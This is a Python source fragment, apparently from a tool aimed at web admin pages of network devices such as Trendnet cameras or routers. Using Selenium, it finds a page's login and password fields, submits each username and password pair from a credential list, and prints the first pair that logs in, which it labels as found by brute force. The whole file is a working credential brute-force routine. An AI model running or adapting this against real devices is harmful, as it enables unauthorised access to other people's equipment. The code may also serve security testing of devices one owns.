class find_auth():
  @staticmethod
  def find_auth(webPage):
    has_id = 0
    with open(CREDENTIAL_CORPUS, 'r') as fp:
      cred = [(line.rstrip()).split(',') for line in fp]
    
    text_elements = webPage.find_elements_by_xpath("//input[@type='text']")
  
    password = webPage.find_element_by_xpath("//input[@type='password']")
    password_id = password.get_attribute("id")
  
    try:
      submit = webPage.find_element_by_xpath("//input[@type='submit']")
    except:
       #found in Trendnet 0c*
      submit = webPage.find_element_by_xpath("//input[@type='button']")
    
    submit_name = submit.get_attribute("name")
    if submit_name is None:
      has_id = 1
      submit_name = submit.get_attribute("id")
  
    for element in text_elements: #finding login field
      if (element.is_displayed()):
        login = element #login field
        login_id = element.get_attribute("id")
        
    url = webPage.current_url 
  
    for creds in cred:
      webPage.get(url)
  
      login = webPage.find_element_by_id(login_id)
      password = webPage.find_element_by_id(password_id)
      if has_id:
        submit = webPage.find_element_by_id(submit_name)
      else:
        submit = webPage.find_element_by_name(submit_name)
  
      if creds[0] != '_':
        login.send_keys(creds[0])
      else:
        login.clear()
      
      if creds[1] != '_':
        password.send_keys(creds[1])
      else:
        password.clear()
      
      submit.click()
      time.sleep(1)
  
      if check_state(webPage):
        logging.info('[AUTH] Credentials discovered through brute-force')
        print creds[0], creds[1]
        return 0
      print webPage.current_url
  
    return 1
